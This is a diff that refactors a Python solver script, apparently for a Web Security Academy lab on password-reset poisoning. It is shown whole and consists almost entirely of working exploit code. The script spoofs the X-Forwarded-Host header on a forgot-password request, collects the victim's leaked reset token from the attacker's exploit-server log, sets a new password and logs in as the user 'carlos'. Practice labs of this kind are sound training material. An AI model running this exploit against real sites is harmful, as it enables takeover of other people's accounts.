@@ -85,54 +85,92 @@ import requests
 import urllib3
 
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-session = requests.Session()
-url = 'https://0a0c004703e21a82816743f3003d0057.web-security-academy.net'
+def setup_session():
+    """Sets up the requests session and disables SSL warnings."""
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+    session = requests.Session()
+    return session, proxies
 
 
-resp = session.get(url, verify=False, proxies=proxies)
-html = resp.content.decode()
+def get_exploit_server_url(session, url, proxies):
+    """Retrieves the exploit server URL from the main page."""
+    resp = session.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(resp.content.decode(), 'html.parser')
+    return soup.find("a", id="exploit-link")["href"]
 
-soup = BeautifulSoup(html, 'html.parser')
-url_server = soup.find("a", id="exploit-link")["href"]  # i.e: https://exploit-0a9e006f04d05b02810f4c110147007e.exploit-server.net
-url_exploit = url_server + '/exploit'
-url_email = url_server + '/email'
-url_log = url_server + '/log'
-url_forgot_password = url + '/forgot-password'
 
-r_get_forg_pass = session.get(url_forgot_password, verify=False, proxies=proxies)
-url_forwarded = url_server.split('://')[1]
-data = {'username':'carlos'}
-headers = {'X-Forwarded-Host':url_forwarded}
-r_post_forg_pass = session.post(url_forgot_password, data=data, headers=headers, verify=False, proxies=proxies)
-r_email = session.get(url_email, verify=False, proxies=proxies)
+def reset_password(session, url, proxies, url_server):
+    """Sends the password reset request with a manipulated header."""
+    url_forgot_password = url + '/forgot-password'
+    headers = {'X-Forwarded-Host': url_server.split('://')[1]}
+    data = {'username': 'carlos'}
+    session.post(url_forgot_password, data=data, headers=headers, verify=False, proxies=proxies)
 
-r_log = session.get(url_log, verify=False, proxies=proxies)
 
-soup = BeautifulSoup(r_log.text, 'html.parser')
-pre_content = soup.find('pre').getText().splitlines()
-lines = [line.strip() for line in pre_content if 'GET /forgot-password?temp-forgot-password-token=' in line]
-line = lines[-1]
-pattern = r'GET (/forgot-password\?temp-forgot-password-token=[\w\d]+)'
-match = re.search(pattern, line)
-temp_token_url = match.group(0).split(' ')[1]
-token = temp_token_url.split('=')[1]
+def extract_token_from_log(session, url_log, proxies):
+    """Extracts the temporary token from the server log."""
+    r_log = session.get(url_log, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r_log.text, 'html.parser')
+    pre_content = soup.find('pre').getText().splitlines()
+    lines = [line.strip() for line in pre_content if 'GET /forgot-password?temp-forgot-password-token=' in line]
+    if not lines:
+        raise ValueError("Token not found in the log.")
+    line = lines[-1]
+    pattern = r'GET (/forgot-password\?temp-forgot-password-token=[\w\d]+)'
+    match = re.search(pattern, line)
+    return match.group(0).split(' ')[1]
 
-url_reset_password = url + temp_token_url
-r_get_reset_password = session.get(url_reset_password, verify=False, proxies=proxies)
-soup = BeautifulSoup(r_get_reset_password.text, 'html.parser')
-params = soup.find_all('input')
-token_param = params[0]['name']
-pwd_1 = params[1]['name']
-pwd_2 = params[2]['name']
-data = {token_param:token, pwd_1:'password', pwd_2:'password'}
-r_post_reset_password = session.post(url_reset_password, data=data, verify=False, proxies=proxies)
 
-url_login= url + '/login'
-data = {'username':'carlos', 'password':'password'}
-r_post_login = session.post(url_login, data=data, verify=False, proxies=proxies)
+def perform_password_reset(session, url, token_url, proxies):
+    """Performs the password reset using the token."""
+    url_reset_password = url + token_url
+    r_get_reset_password = session.get(url_reset_password, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r_get_reset_password.text, 'html.parser')
+    params = soup.find_all('input')
+    data = {
+        params[0]['name']: token_url.split('=')[1],
+        params[1]['name']: 'password',
+        params[2]['name']: 'password'
+    }
+    session.post(url_reset_password, data=data, verify=False, proxies=proxies)
 
-if 'Your username is: carlos' in r_post_login.text:
-    print('Lab Solved!')
+
+def login_with_new_password(session, url, proxies):
+    """Attempts to log in with the new password."""
+    url_login = url + '/login'
+    data = {'username': 'carlos', 'password': 'password'}
+    r_post_login = session.post(url_login, data=data, verify=False, proxies=proxies)
+    return 'Your username is: carlos' in r_post_login.text
+
+
+def main():
+    # Initial setup
+    session, proxies = setup_session()
+    url = 'https://0add003d045f806782265ba6001e000c.web-security-academy.net'
+
+    # Step 1: Get the exploit server URL
+    url_server = get_exploit_server_url(session, url, proxies)
+
+    # Step 2: Prepare relevant URLs
+    url_log = url_server + '/log'
+
+    # Step 3: Reset password and manipulate header
+    reset_password(session, url, proxies, url_server)
+
+    # Step 4: Extract token from the log
+    token_url = extract_token_from_log(session, url_log, proxies)
+
+    # Step 5: Perform password reset
+    perform_password_reset(session, url, token_url, proxies)
+
+    # Step 6: Log in with the new password
+    if login_with_new_password(session, url, proxies):
+        print('Lab Solved!')
+    else:
+        print('Error solving the lab.')
+
+
+if __name__ == '__main__':
+    main()
 ```
